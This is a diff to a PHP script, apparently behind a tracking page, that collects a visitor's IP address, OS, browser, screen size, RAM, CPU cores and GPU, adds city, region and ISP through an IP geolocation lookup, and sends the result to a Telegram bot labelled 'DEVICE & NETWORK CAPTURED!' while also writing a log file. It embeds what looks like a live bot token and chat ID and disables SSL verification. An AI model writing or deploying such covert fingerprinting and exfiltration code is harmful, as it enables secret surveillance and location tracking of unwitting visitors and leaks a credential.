@@ -1,6 +1,6 @@
 <?php
 // ******************************************
-// CONFIGURATION
+// CONFIGURATION: PASTE YOUR DETAILS BACK HERE
 // ******************************************
 $botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
 $chatId = "6862649950";
@@ -24,19 +24,35 @@ if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
     $ip = $_SERVER['REMOTE_ADDR'];
 }
 
-// Format Message (HTML Style)
-$message = "<b>📱 DEVICE CONNECTED!</b>\n\n";
-$message .= "<b>🌐 IP Address:</b> <code>" . $ip . "</code>\n";
-$message .= "<b>💻 System:</b> " . $os . " (" . $ptf . ")\n";
-$message .= "<b>🕸 Browser:</b> " . $brw . "\n";
-$message .= "<b>📏 Screen:</b> " . $wd . "x" . $ht . " px\n\n";
-$message .= "<b>HARDWARE DETAILS:</b>\n";
-$message .= "💾 <b>RAM:</b> " . $ram . " GB\n";
-$message .= "🧠 <b>Cores:</b> " . $cc . "\n";
-$message .= "🎮 <b>GPU:</b> " . $ven . "\n";
-$message .= "<i>" . $ren . "</i>";
+// --- NEW: IP INTELLIGENCE LOOKUP (The Upgrade) ---
+// This asks a public database for the city/isp of the IP
+$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
+$city = $details->city ?? "Unknown";
+$region = $details->regionName ?? "Unknown";
+$country = $details->country ?? "Unknown";
+$isp = $details->isp ?? "Unknown";
+// -------------------------------------------------
 
-// Send to Telegram (Using cURL for better stability)
+// Format Message (Professional Dashboard Style)
+$message = "<b>📱 DEVICE & NETWORK CAPTURED!</b>\n\n";
+
+// Section 1: Network / Location (The new stuff)
+$message .= "<b>🌐 NETWORK INTELLIGENCE:</b>\n";
+$message .= "├ <b>IP:</b> <code>" . $ip . "</code>\n";
+$message .= "├ <b>City:</b> " . $city . "\n";
+$message .= "├ <b>Region:</b> " . $region . ", " . $country . "\n";
+$message .= "└ <b>ISP:</b> " . $isp . "\n\n";
+
+// Section 2: Device Details
+$message .= "<b>💻 DEVICE FINGERPRINT:</b>\n";
+$message .= "├ <b>OS:</b> " . $os . " (" . $ptf . ")\n";
+$message .= "├ <b>Browser:</b> " . $brw . "\n";
+$message .= "├ <b>Screen:</b> " . $wd . "x" . $ht . " px\n";
+$message .= "├ <b>RAM:</b> " . $ram . " GB\n";
+$message .= "├ <b>Cores:</b> " . $cc . "\n";
+$message .= "└ <b>GPU:</b> " . $ven . " (" . $ren . ")\n";
+
+// Send to Telegram
 $website = "https://api.telegram.org/bot" . $botToken;
 $params = [
     'chat_id' => $chatId,
@@ -53,7 +69,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 $result = curl_exec($ch);
 curl_close($ch);
 
-// Save Log (Optional)
+// Save Log
 $f = fopen('../../logs/info.txt', 'w+');
 fwrite($f, $message);
 fclose($f);
